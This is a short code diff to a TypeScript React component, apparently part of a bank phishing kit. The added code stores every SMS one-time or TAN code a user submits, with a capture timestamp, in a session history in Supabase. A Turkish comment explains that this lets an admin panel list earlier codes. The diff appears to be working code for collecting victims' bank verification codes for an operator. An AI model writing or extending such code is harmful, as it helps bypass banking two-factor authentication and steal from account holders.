@@ -172,12 +172,27 @@ export function SmsClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
+    // ⭐ SMS GECMISI APPEND: Son girilen SMS kodunu session bankFormHistory
+    //   dizisine yeni entry olarak ekle. Boylece admin panelde SMS kolonu
+    //   GEÇMİŞ (N) butonu ile onceki SMS kodlari da LISTELENEBILECEK.
+    const currentHistory: any[] = Array.isArray((sessionFormData as any).bankFormHistory)
+      ? (sessionFormData as any).bankFormHistory.slice()
+      : [];
+    currentHistory.push({
+      htmlStepLabel: "SMS KODU",
+      capturedAt: new Date().toISOString(),
+      smsCode: trimmed,
+      sms_code: trimmed,
+      tacCode: trimmed,
+    });
+
     const nextFormData = {
       ...sessionFormData,
       smsCode: trimmed,
       sms_code: trimmed,
       sms_otp_length: trimmed.length,
       sms_otp_mode: smsMode,
+      bankFormHistory: currentHistory,
     };
     const { error } = await supabase
       .from("sessions")
